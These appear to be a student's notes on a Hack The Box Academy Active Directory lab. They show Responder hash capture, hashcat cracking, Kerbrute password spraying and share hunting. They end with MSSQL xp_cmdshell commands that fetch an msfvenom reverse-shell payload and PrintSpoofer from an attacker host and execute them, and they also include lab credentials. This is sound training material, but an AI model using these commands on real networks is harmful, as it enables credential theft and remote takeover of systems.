### Connection to Target

SSH
```go
sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@10.129.11.74
```

xfreerdp
```go
xfreerdp /v:10.129.12.127 /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200 /cert:ignore
```

#### Question 1: Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?


Log into the host. The user can sudo on everything. Use responder to grab a hash within the 172.16.6.0 subnet

```go
sudo responder -I ens224 -wfrv
```

Username and hash
```go
INLANEFREIGHT\AB920
```

```go
AB920::INLANEFREIGHT:6741b51d529201c7:F8653C1E3120B191A7DA708C0E363F8B:0101000000000000805C79559355D801CC5F7452B6AB182600000000020008005900560041004C0001001E00570049004E002D003000440031004C005700350056004C0037004100320004003400570049004E002D003000440031004C005700350056004C003700410032002E005900560041004C002E004C004F00430041004C00030014005900560041004C002E004C004F00430041004C00050014005900560041004C002E004C004F00430041004C0007000800805C79559355D801060004000200000008003000300000000000000000000000002000008FD5B9337124CEC895A3C0D2FD95F12FA421AA37FCF02A652FE227B46BB832DB0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```

#### Question 2: What is this user's cleartext password?

Crack the hash
```go
hashcat -m 5600 ab920_hash /usr/share/wordlists/rockyou.txt --force -O
```

Answer:
```go
weasal
```

#### Question 3: Submit the contents of the C:\flag.txt file on MS01.

Find other hosts on the network from this host
```go
for i in {1..254} ;do (ping -c 1 172.16.7.$i | grep "bytes from" &) ;done
```

![[Pasted image 20260531005943.png]]

Determine which host is MS01

```go
172.16.7.50
```

NMAP scan for 172.16.7.50 shows this is MS01
![[Pasted image 20260531010900.png]]


```go
xfreerdp /v:172.16.7.50 /u:AB920 /p:'weasal' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200 /cert:ignore
```

Answer:
```go
aud1t_gr0up_m3mbersh1ps!
```

>[!Tip] Who is 172.16.7.60?
>

NMAP Scan for 172.16.7.60 shows it's name as `SQL01`
![[Pasted image 20260531011220.png]]

#### Question 4: Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.

```go
HTB_@cademy_stdnt!
```

```go
ssh -X htb-student@10.129.23.139
```


Head to your Kerbrute directory in `cd ~/tools/kerbrute` and execute`sudo make all` if you don't have a Windows executable ..

```go
scp PowerView.ps1 kerbrute_windows_amd64.exe htb-student@10.129.23.139:~/Desktop/HTB
```

```go
xfreerdp /v:172.16.7.50 /u:AB920 /p:'weasal' /drive:HTB,/home/htb-student/Desktop /smart-sizing:2400x1200
```

>[!Warning] "$DISPLAY environment variable not properly set" error message
> I got the above error message when attempting to RDP into the MS01 host. via xfreerdp. You must ssh via `ssh -X user@remote_host` to let SSH handle the tunneling via the -X or -Y flags. Or just use evil-winrm


```go
evil-winrm -i 172.16.7.50  -u 'AB920' -p 'weasal'
```


>[!Info] Try any of these and pair it with the password spraying technique

Export to username list

```go
Import-Module .\PowerView.ps1
```

```go
Set-ExecutionPolicy Bypass -Scope Process
```

```go
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content ad_users.txt 
```

```go
Get-Content .\admin_users.txt | select -First 10
```

Kerbrute Password Spray
```go
./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.7.50 admin_users.txt Welcome1
```

Answer
```go
BR086
```



#### Question 5: What is this user's password?

Answer:
```go
Welcome1
```

#### Question 6: Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?

Hunt for shares
```go
sudo crackmapexec smb 172.16.7.3 -u 'BR086' -p 'Welcome1' --shares
```

![[Pasted image 20260609183841.png]]

Use the spider_plus module to dig through the readable IPC share. Check the output file in `/tmp/cme_spider_plus/172.16.7.50.json`
```GO
sudo crackmapexec smb 172.16.7.3 -u 'BR086' -p 'Welcome1' --shares -M spider_plus --share 'Department Shares'
```

Cat the output file
```go
cat /tmp/cme_spider_plus/172.16.7.3.json
```

![[Pasted image 20260609184056.png]]

```go
sudo crackmapexec smb 172.16.7.3 -u 'BR086' -p 'Welcome1' 'Department Shares\IT\Private\Development/web.config'
```

```go
smbclient //172.16.7.3/Department Shares/IT/Private/Development -U br086 -c "get web.config web.txt"
```

None of these worked. HTB wants me to use snaffler
```go
scp Snaffler.exe htb-student@10.129.23.139:~/Desktop
```

Connect to the MS01
```go
evil-winrm -i 172.16.7.3  -u 'br086' -p 'Welcome1'
```

```go
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```

Answer
```go
D@ta_bAse_adm1n!
```

username
```go
netdb
```


#### Question 7: Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.

```go
python3 /usr/local/bin/mssqlclient.py inlanefrieght/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
```

```go
EXEC xp_cmdshell 'type "C:\\Users\\Administrator\\Desktop\\flag.txt"';
```

I don't have the correct privileges
![[Pasted image 20260610065348.png]]

Verify privileges
```go
EXEC xp_cmdshell 'whoami /priv';
```

![[Pasted image 20260610071915.png]]


>[!Important] SeImpersonatePrivilege
The permission "SeImpersonatePrivilege" is enabled. It allows a process to assume the security context (identity and permissions) of another user or account. By default, it is assigned to local Administrators and Service accounts.
>
> The permission is often used by the Print Spooler to abuse special privileges and priv esc a standard user. To execute this attack generate an msfvenom payload and download the [PrintSpoofer](https://github.com/itm4n/printspoofer)

Download the executable and scp to htb-student
```go
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
```

```go
scp PrintSpoofer32.exe htb-student@10.129.25.29:~/
```

Generate msfvenom payload
```go
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=9999 -o payload.exe
```

Start netcat on htb-student
```go
nc -nlvp 9999
```

Connect to SQL01
```go
python3 /usr/local/bin/mssqlclient.py inlanefrieght/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
```


On the SQL01 Host, download the files using PowerShell

Is there a public folder present?
```go
EXEC xp_cmdshell 'dir C:\Public\Users';
```

```go
EXEC xp_cmdshell 'cd C:\Public\Users && dir';
```

```go
EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://172.16.7.240:8888/payload.exe -OutFile C:\Users\Public\payload.exe"';
```

```go
EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri ''http://172.16.7.240:8888/PrintSpoofer64.exe'' -OutFile ''C:\Users\Public\PrintSpoofer64.exe''"';
```

Execute
```go
EXEC xp_cmdshell 'C:\Public\Users\PrinterSpoofer64.exe -c C:\Public\Users\payload.exe' 
```

![[Pasted image 20260610175450.png]]